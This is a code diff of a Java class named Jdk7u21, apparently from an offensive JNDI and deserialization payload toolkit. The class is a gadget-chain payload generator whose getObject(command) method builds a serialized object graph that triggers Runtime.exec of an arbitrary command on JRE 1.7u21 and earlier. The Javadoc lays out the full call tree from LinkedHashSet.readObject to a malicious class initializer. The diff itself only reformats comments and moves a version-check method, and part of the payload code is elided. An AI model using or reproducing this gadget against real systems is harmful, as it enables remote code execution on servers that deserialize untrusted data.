@@ -1,6 +1,5 @@
 package com.qi4l.jndi.gadgets;
 
-import com.qi4l.jndi.enumtypes.PayloadType;
 import com.qi4l.jndi.gadgets.annotation.Authors;
 import com.qi4l.jndi.gadgets.annotation.Dependencies;
 import com.qi4l.jndi.gadgets.utils.Gadgets;
@@ -15,48 +14,52 @@ import java.util.HashMap;
 import java.util.LinkedHashSet;
 
 
-
 /**
  * Gadget chain that works against JRE 1.7u21 and earlier. Payload generation has
  * the same JRE version requirements.
- *
+ * <p>
  * See: https://gist.github.com/frohoff/24af7913611f8406eaf3
- *
+ * <p>
  * Call tree:
- *
+ * <p>
  * LinkedHashSet.readObject()
- *   LinkedHashSet.add()
- *     ...
- *       TemplatesImpl.hashCode() (X)
- *   LinkedHashSet.add()
- *     ...
- *       Proxy(Templates).hashCode() (X)
- *         AnnotationInvocationHandler.invoke() (X)
- *           AnnotationInvocationHandler.hashCodeImpl() (X)
- *             String.hashCode() (0)
- *             AnnotationInvocationHandler.memberValueHashCode() (X)
- *               TemplatesImpl.hashCode() (X)
- *       Proxy(Templates).equals()
- *         AnnotationInvocationHandler.invoke()
- *           AnnotationInvocationHandler.equalsImpl()
- *             Method.invoke()
- *               ...
- *                 TemplatesImpl.getOutputProperties()
- *                   TemplatesImpl.newTransformer()
- *                     TemplatesImpl.getTransletInstance()
- *                       TemplatesImpl.defineTransletClasses()
- *                         ClassLoader.defineClass()
- *                         Class.newInstance()
- *                           ...
- *                             MaliciousClass.<clinit>()
- *                               ...
- *                                 Runtime.exec()
+ * LinkedHashSet.add()
+ * ...
+ * TemplatesImpl.hashCode() (X)
+ * LinkedHashSet.add()
+ * ...
+ * Proxy(Templates).hashCode() (X)
+ * AnnotationInvocationHandler.invoke() (X)
+ * AnnotationInvocationHandler.hashCodeImpl() (X)
+ * String.hashCode() (0)
+ * AnnotationInvocationHandler.memberValueHashCode() (X)
+ * TemplatesImpl.hashCode() (X)
+ * Proxy(Templates).equals()
+ * AnnotationInvocationHandler.invoke()
+ * AnnotationInvocationHandler.equalsImpl()
+ * Method.invoke()
+ * ...
+ * TemplatesImpl.getOutputProperties()
+ * TemplatesImpl.newTransformer()
+ * TemplatesImpl.getTransletInstance()
+ * TemplatesImpl.defineTransletClasses()
+ * ClassLoader.defineClass()
+ * Class.newInstance()
+ * ...
+ * MaliciousClass.<clinit>()
+ * ...
+ * Runtime.exec()
  */
 
-@SuppressWarnings({"rawtypes", "unchecked","unused"})
+@SuppressWarnings({"rawtypes", "unchecked", "unused"})
 @Dependencies()
 @Authors({Authors.FROHOFF})
 public class Jdk7u21 implements ObjectPayload<Object> {
+
+    public static boolean isApplicableJavaVersion() {
+        JavaVersion v = JavaVersion.getLocalVersion();
+        return v != null && (v.major < 7 || (v.major == 7 && v.update <= 21));
+    }
 
     public Object getObject(String command) throws Exception {
         final Object templates;
@@ -94,10 +97,5 @@ public class Jdk7u21 implements ObjectPayload<Object> {
         map.put(zeroHashCodeStr, templates);
 
         return set;
-    }
-
-    public static boolean isApplicableJavaVersion() {
-        JavaVersion v = JavaVersion.getLocalVersion();
-        return v != null && (v.major < 7 || (v.major == 7 && v.update <= 21));
     }
 }
